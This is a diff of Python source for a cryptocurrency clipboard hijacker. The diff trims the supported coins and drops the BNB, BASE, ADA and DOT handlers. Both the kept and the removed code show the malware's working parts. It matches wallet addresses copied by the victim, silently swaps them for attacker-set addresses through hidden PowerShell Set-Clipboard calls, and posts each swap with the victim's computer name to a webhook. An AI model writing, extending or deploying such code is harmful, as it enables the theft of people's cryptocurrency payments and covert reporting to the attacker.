@@ -15,10 +15,6 @@ ltcaddr = "SET LTC ADDRESS HERE"
 xmraddr = "SET XMR ADDRESS HERE"
 soladdr = "SET SOL ADDRESS HERE"
 dogeaddr = "SET DOGE ADDRESS HERE"
-bnbaddr = "SET BNB ADDRESS HERE"
-baseaddr = "SET BASE ADDRESS HERE"
-adaaddr = "SET ADA ADDRESS HERE"
-dotaddr = "SET DOT ADDRESS HERE"
 xrpaddr = "SET XRP ADDRESS HERE"
 trxaddr = "SET TRX ADDRESS HERE"
 
@@ -43,14 +39,10 @@ def is_crypto_addr(clipboard_text):
         eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
         ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
         xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
-        sol_address_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
-        doge_address_pattern = r"^D[5-9A-HJ-NP-Ua-km-z]{33,34}$"
-        bnb_address_pattern = r"^bnb1[0-9a-z]{38}$"
-        base_address_pattern = r"^0x[a-fA-F0-9]{40}$"
-        ada_address_pattern = r"^addr1[0-9a-z]{58,59}$"
-        dot_address_pattern = r"^1[a-km-zA-HJ-NP-Z1-9]{47}$"
-        xrp_address_pattern = r"^r[1-9A-HJ-NP-Za-km-z]{25,35}$"
-        trx_address_pattern = r"^T[1-9A-HJ-NP-Za-km-z]{33}$"
+        sol_address_pattern = r"^(?:[a-zA-Z0-9]){44}$"
+        doge_address_pattern = r"^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$"
+        xrp_address_pattern = r"^r[0-9a-zA-Z]{24,34}$"
+        trx_address_pattern = r"^T[a-zA-Z0-9]{33}$"
 
         if re.match(btc_address_pattern, clipboard_text):
             return "BTC"
@@ -64,14 +56,6 @@ def is_crypto_addr(clipboard_text):
             return "SOL"
         elif re.match(doge_address_pattern, clipboard_text):
             return "DOGE"
-        elif re.match(bnb_address_pattern, clipboard_text):
-            return "BNB"
-        elif re.match(base_address_pattern, clipboard_text):
-            return "BASE"
-        elif re.match(ada_address_pattern, clipboard_text):
-            return "ADA"
-        elif re.match(dot_address_pattern, clipboard_text):
-            return "DOT"
         elif re.match(xrp_address_pattern, clipboard_text):
             return "XRP"
         elif re.match(trx_address_pattern, clipboard_text):
@@ -253,122 +237,6 @@ def main():
                                 else:
                                     message = {
                                         "content": f"```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
-                                    }
-
-                                json_data = json.dumps(message)
-
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
-
-                                response = conn.getresponse()
-
-                                response.read()
-                                conn.close()
-                elif var == "BNB":
-                    if bnbaddr != "SET BNB ADDRESS HERE":
-                        if clipboard_text != bnbaddr:
-                            subprocess.run(['powershell', '-command', f'Set-Clipboard -Value "{bnbaddr}"'],
-                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
-                            if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                            if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected BNB address on {comp_name} - changed to {bnbaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected BNB address on {comp_name} - changed to {bnbaddr}\n```"
-                                    }
-
-                                json_data = json.dumps(message)
-
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
-
-                                response = conn.getresponse()
-
-                                response.read()
-                                conn.close()
-                elif var == "BASE":
-                    if baseaddr != "SET BASE ADDRESS HERE":
-                        if clipboard_text != baseaddr:
-                            subprocess.run(['powershell', '-command', f'Set-Clipboard -Value "{baseaddr}"'],
-                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
-                            if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                            if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected BASE address on {comp_name} - changed to {baseaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected BASE address on {comp_name} - changed to {baseaddr}\n```"
-                                    }
-
-                                json_data = json.dumps(message)
-
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
-
-                                response = conn.getresponse()
-
-                                response.read()
-                                conn.close()
-                elif var == "ADA":
-                    if adaaddr != "SET ADA ADDRESS HERE":
-                        if clipboard_text != adaaddr:
-                            subprocess.run(['powershell', '-command', f'Set-Clipboard -Value "{adaaddr}"'],
-                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
-                            if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                            if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected ADA address on {comp_name} - changed to {adaaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected ADA address on {comp_name} - changed to {adaaddr}\n```"
-                                    }
-
-                                json_data = json.dumps(message)
-
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
-
-                                response = conn.getresponse()
-
-                                response.read()
-                                conn.close()
-                elif var == "DOT":
-                    if dotaddr != "SET DOT ADDRESS HERE":
-                        if clipboard_text != dotaddr:
-                            subprocess.run(['powershell', '-command', f'Set-Clipboard -Value "{dotaddr}"'],
-                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
-                            if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                            if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected DOT address on {comp_name} - changed to {dotaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected DOT address on {comp_name} - changed to {dotaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
